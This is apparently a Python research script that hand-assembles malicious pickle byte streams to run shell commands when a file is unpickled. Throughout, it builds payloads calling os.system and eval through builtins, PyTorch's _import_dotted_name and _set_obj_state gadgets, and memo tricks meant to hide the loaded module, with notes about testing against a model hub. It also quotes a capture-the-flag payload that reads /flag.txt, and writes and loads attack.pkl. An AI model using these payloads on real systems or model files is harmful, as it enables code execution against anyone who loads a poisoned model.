import createlib as op, io
from struct import pack
import pickletools, pickle

class MyPickle(op._Pickler):
    def __init__(self, f):
        super().__init__(f)
        self.write(op.PROTO + pack("<B", 4))
        self.framer.start_framing()
    
    def __add__(self, v):
        self.write(v)
        return self

    def finish(self):
        self.write(op.STOP)
        self.framer.end_framing()

def push_int_list(int_list):
    obj = op.EMPTY_LIST + \
        op.MARK
    for i in int_list:
        obj += (op.BININT + pack("<i", i))
    obj += op.APPENDS
    return obj

def push_short_string(s):
    l = len(s)
    if l > 0xff:
        raise ValueError("too long")
    return op.SHORT_BINUNICODE + pack("<B", l) + s

def push_short_int(i):
    if i > 0xff:
        raise ValueError("too long")
    return op.BININT1 + pack("<B", i)

def memo_get(i):
    return op.GET + repr(i).encode("ascii") + b'\n'

# https://ctftime.org/writeup/33666
obj = b'\x80\x04' \
           b'Vempty\nV__class__.__base__\n\x93p0\n' \
           b'(Vempty\nV__setattr__\n\x93p1\n' \
           b'g1\n(Vobj\ng0\ntR' \
           b'Vempty\nVobj.__getattribute__\n\x93p2\n' \
           b'g1\n(Vsc\nVempty\nVobj.__subclasses__\n\x93)RtR' \
           b'Vempty\nVsc.__getitem__\n\x93p3\n' \
           b'g1\n(Vi\ng2\n(g3\n(I100\ntRV__init__\ntRtR' \
           b'g1\n(Vgl\nVempty\nVi.__globals__\n\x93tR' \
           b'Vempty\nVgl.__getitem__\n\x93p4\n' \
           b'g1\n(Vb\ng4\n(V__builtins__\ntRtR' \
           b'Vempty\nVb.__getitem__\n\x93p5\n' \
           b'g1\n(Ve\ng5\n(Veval\ntRtR' \
           b'Vempty\nVe\n\x93(Vprint(open("/flag.txt").read())\ntR.'

def system_ls():
    # Simple form.
    obj = push_short_string(b'posix')
    obj += push_short_string(b'system')
    obj += op.STACK_GLOBAL
    obj += push_short_string(b'ls')
    obj += op.TUPLE1
    obj += op.REDUCE
    return obj

def system_ls2():
    # use builtins
    obj = push_short_string(b'builtins')
    obj += push_short_string(b'__import__')
    obj += op.STACK_GLOBAL

    obj += push_short_string(b'os')
    obj += op.TUPLE1
    obj += op.REDUCE
    obj += op.MEMOIZE
    obj += op.POP

    obj += push_short_string(b'builtins')
    obj += push_short_string(b'getattr')
    obj += op.STACK_GLOBAL

    obj += memo_get(0)
    obj += push_short_string(b'system')
    obj += op.TUPLE2
    obj += op.REDUCE

    obj += push_short_string(b'ls')
    obj += op.TUPLE1
    obj += op.REDUCE

    return obj

def system_ls3():
    # Use getattr
    obj = push_short_string(b'os')
    obj += push_short_string(b'__getattribute__')
    obj += op.STACK_GLOBAL
    
    obj += push_short_string(b'system')
    obj += op.TUPLE1
    obj += op.REDUCE
    
    obj += push_short_string(b'ls')
    obj += op.TUPLE1
    obj += op.REDUCE
    return obj

# TODO: test on HF
def system_ls4():
    # Use memoize to hide the module / function loaded
    obj = push_short_string(b'os')
    obj += op.MEMOIZE
    obj += op.POP

    obj += push_short_string(b'system')
    obj += op.MEMOIZE
    obj += op.POP

    obj += memo_get(0)
    obj += memo_get(1)
    obj += op.STACK_GLOBAL

    obj += push_short_string(b'ls')
    obj += op.TUPLE1
    obj += op.REDUCE
    return obj

# TODO: test on HF
def system_ls5():
    # __main__.some_func
    obj = push_short_string(b'__main__')
    obj += push_short_string(b'some_func')
    obj += op.STACK_GLOBAL
    obj += op.MEMOIZE
    
    # wash the string via return function.
    # posix
    obj += push_short_string(b'posix')
    obj += op.TUPLE1
    obj += op.REDUCE

    # wash the string via return function.
    # system
    obj += memo_get(0)
    obj += push_short_string(b'system')
    obj += op.TUPLE1
    obj += op.REDUCE

    # load(posix.system)
    obj += op.STACK_GLOBAL

    # posix.system(ls)
    obj += push_short_string(b'ls')
    obj += op.TUPLE1
    obj += op.REDUCE
    return obj

# TODO: tests on HF
def system_ls6():
    # __main__.some_func
    obj = push_short_string(b'__main__')
    obj += push_short_string(b'some_cap_fn')
    obj += op.STACK_GLOBAL
    
    obj += op.EMPTY_TUPLE
    obj += op.REDUCE
    return obj

def object_with_dict():
    obj = push_short_string(b'__main__')
    obj += push_short_string(b'SomeClass')
    obj += op.STACK_GLOBAL

    obj += op.EMPTY_TUPLE
    obj += op.NEWOBJ

    obj += op.MARK
    obj += push_short_string(b'number')
    obj += push_short_int(5)
    obj += op.DICT
    # setstate(dict={number:5})
    obj += op.BUILD
    return obj

def setstate_internal_ls():
    obj = push_short_string(b'__main__')
    obj += push_short_string(b'SomeClass')
    obj += op.STACK_GLOBAL

    obj += op.EMPTY_TUPLE
    obj += op.NEWOBJ

    # NOTE: we could just call the function directly.
    # But this demonstrates how to trigger the exploit _after_ unpickling.
    # Could also be done via a timer maybe.
    obj += op.MARK
    obj += push_short_string(b'a_func')
    obj += push_short_string(b'__main__')
    obj += push_short_string(b'some_exec_fn')
    # We could instead load system.ls
    # obj += push_short_string(b'posix')
    # obj += push_short_string(b'system')
    obj += op.STACK_GLOBAL
    obj += op.DICT

    obj += op.BUILD
    return obj

the_mod = b'torch'

def pytorch_system_ls():
    obj = push_short_string(the_mod)
    obj += push_short_string(b'_import_dotted_name')
    obj += op.STACK_GLOBAL
    obj += push_short_string(b'posix.system')
    obj += op.TUPLE1
    obj += op.REDUCE
    obj += push_short_string(b'ls')
    obj += op.TUPLE1
    obj += op.REDUCE
    return obj

def pytorch_system_ls2():
    obj = push_short_string(b'__main__')
    obj += push_short_string(b'SomeClass')
    obj += op.STACK_GLOBAL

    obj += op.EMPTY_TUPLE
    obj += op.NEWOBJ
    obj += op.MEMOIZE
    obj += op.POP

    obj += op.MARK
    obj += push_short_string(b'a_func')
    obj += push_short_string(the_mod)
    obj += push_short_string(b'_import_dotted_name')
    obj += op.STACK_GLOBAL
    obj += push_short_string(b'posix.system')
    obj += op.TUPLE1
    obj += op.REDUCE
    obj += op.DICT
    
    obj += op.MEMOIZE
    obj += op.POP

    # _set_obj_state is NOT exported!
    obj += push_short_string(b'__main__')
    obj += push_short_string(b"_set_obj_state")
    obj += op.STACK_GLOBAL
    obj += memo_get(0)
    obj += memo_get(1)
    obj += op.TUPLE2
    obj += op.REDUCE
    return obj

# Uses only internal module to execute.
# With torch module, we get `AttributeError: 'dict' object has no attribute 'eval'` error.
# Need to determine a suitable object.
def system_ls7():
    obj = push_short_string(b'__main__')
    obj += push_short_string(b'__builtins__.__getattribute__')
    obj += op.STACK_GLOBAL    

    obj += push_short_string(b'eval')
    obj += op.TUPLE1
    obj += op.REDUCE

    obj += push_short_string(b'__import__("os").system("ls")')
    obj += op.TUPLE1
    obj += op.REDUCE
    return obj

def system_ls8():
    obj = push_short_string(b'__main__')
    obj += push_short_string(b'__builtins__.__getattribute__')
    obj += op.STACK_GLOBAL
    
    obj += push_short_string(b'eval')
    obj += op.TUPLE1
    obj += op.REDUCE
    obj += op.MEMOIZE
    obj += op.POP

    obj += push_short_string(b'__main__')
    obj += push_short_string(b'SomeClass')
    obj += op.STACK_GLOBAL

    obj += op.EMPTY_TUPLE
    obj += op.NEWOBJ
    obj += op.MEMOIZE

    obj += op.MARK
    obj += push_short_string(b'b_func')
    obj += memo_get(0)
    obj += op.DICT
    
    obj += op.BUILD
    return obj

def some_func(s):
    return s

def some_cap_fn():
    import os
    os.system("ls")

def some_exec_fn(s):
    import os
    os.system(s)

# From https://github.com/pytorch/pytorch/blob/8162f4170b8c7df3bab503103544e1d7cbf8b052/torch/_utils.py#L463
def _import_dotted_name(name):
    components = name.split(".")
    obj = __import__(components[0])
    for component in components[1:]:
        obj = getattr(obj, component)
    return obj

# From https://github.com/pytorch/pytorch/blob/8162f4170b8c7df3bab503103544e1d7cbf8b052/torch/_utils.py#L439
def _set_obj_state(obj, state):
    if isinstance(state, tuple):
        if not len(state) == 2:
            raise RuntimeError(f"Invalid serialized state: {state}")
        dict_state = state[0]
        slots_state = state[1]
    else:
        dict_state = state
        slots_state = None

    # Starting with Python 3.11, the __dict__ attribute is lazily created
    # and is serialized as None when not needed.
    if dict_state:
        for k, v in dict_state.items():
            setattr(obj, k, v)

    if slots_state:
        for k, v in slots_state.items():
            setattr(obj, k, v)
    return obj

class SomeClass:
    def __init__(self):
        self.number = 3
    def a_func(self, s):
        print(f"I'm a_func called with {s}")
    def b_func(self, s):
        print(f"I'm b_func called with {s}")
    def __getstate__(self):
        #self.a_func = __builtins__.__getattribute__("__import__")("os").system
        return self.__dict__
    def __setstate__(self, v):
        self.__dict__ = v

# TODO: how to load
# TODO: use setstate and dict, append, extend, etc
# TODO: try op.INST

# benchmarks/fastrnns/profile.py contains system()
# https://github.com/pytorch/pytorch/blob/8162f4170b8c7df3bab503103544e1d7cbf8b052/torch/_utils.py#L463 contains import
# https://github.com/pytorch/pytorch/blob/8162f4170b8c7df3bab503103544e1d7cbf8b052/torch/serialization.py#L443 contains read
# https://github.com/pytorch/pytorch/blob/8162f4170b8c7df3bab503103544e1d7cbf8b052/torch/_utils.py#L439 contains setstate
# https://github.com/pytorch/pytorch/blob/a3e9b80082e1faf590ada272c384e2f193d3536c/torch/distributed/nn/api/remote_module.py#L446 contains smore remote eval
# Can we find an import function in the code?
# can we load using __builtins__ from a variable?
# dangerous gadgets: exec, read, write, load

def create_obj(f):
    obj = MyPickle(f)
    # obj = SomeClass()
    #f.write(obj)
    #pickle.dump(obj, f)
    #obj += object_with_dict()
    # TODO: set dict to os.system.__dict__
    #obj += setstate_internal_ls()
    #obj += pytorch_system_ls()
    
    # I tried __builtins__.__getattribute__("__import__")("os").system
    # but failed because I could not get system. I could use getattr but
    # it requires loading the
    

    # __builtins__.__getattribute__("__setattr__")("format", "b")
    #obj += system_ls8()
    #obj += system_ls5()
    # setstate_internal_ls
    #pytorch_system_ls pytorch_system_ls2
    obj += setstate_internal_ls()
   
    #obj += pytorch_system_ls2()
    
    #__builtins__.format(b'__import__("os").system("ls")')

    # obj += push_short_string(b'__import__("os").system("ls")')
    # obj += op.TUPLE1
    # obj += op.REDUCE

    # obj += push_short_string(b'__getattribute__')
    # #obj += op.TUPLE1
    # obj += op.STACK_GLOBAL

    # obj += push_short_string(b'system')
    # obj += op.TUPLE1
    # obj += op.REDUCE
    #obj += op.POP
    # # obj += op.STACK_GLOBAL
    # # obj += op.EMPTY_TUPLE
    # # obj += op.NEWOBJ

    # obj += push_short_string(b'__import__')
    # obj += op.TUPLE1
    # obj += op.REDUCE

    # obj = push_short_string(b'__main__')
    # obj += push_short_string(b'SomeClass')
    # obj += op.STACK_GLOBAL

    # obj += op.EMPTY_TUPLE
    # obj += op.NEWOBJ
    # obj += op.MEMOIZE

    # os.__getattribute__("system")
    # obj += push_short_string(b'os')
    # obj += op.STACK_GLOBAL
    #obj += op.TUPLE1
    #obj += op.REDUCE
    # obj += op.MEMOIZE
    # obj += op.POP

    # obj += push_short_string(b'os.__getattribute__')
    # obj += push_short_string(b'system')
    # #obj += push_short_string(b'system')
    # obj += op.TUPLE1
    # obj += op.REDUCE
    # obj += push_short_string(b'system')
    # obj += op.TUPLE1
    # obj += op.REDUCE
    #create.__builtins__["__import__"]("os")

    obj.finish()
   
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description='display contents of the pickle files')
    parser.add_argument(
        'pickle_file', type=argparse.FileType('br'),
        nargs='*', help='the pickle file')
    parser.add_argument(
        '-t', '--test', action='store_true',
        help='run self-test suite')
    parser.add_argument(
        '-v', action='store_true',
        help='run verbosely; only affects self-test run')
    args = parser.parse_args()

    fn = "attack.pkl"
    with open(fn, "wb") as f:
        create_obj(f)
    with open(fn, "rb") as f:
        #pickletools.dis(f.read(), annotate=1, indentlevel=0)
        f.seek(0)
        obj = pickle.load(f)
        print(obj)
        if hasattr(obj, "a_func"):
            obj.a_func("ls")
        if hasattr(obj, "b_func"):
            obj.b_func(b'__import__("os").system("ls")')
           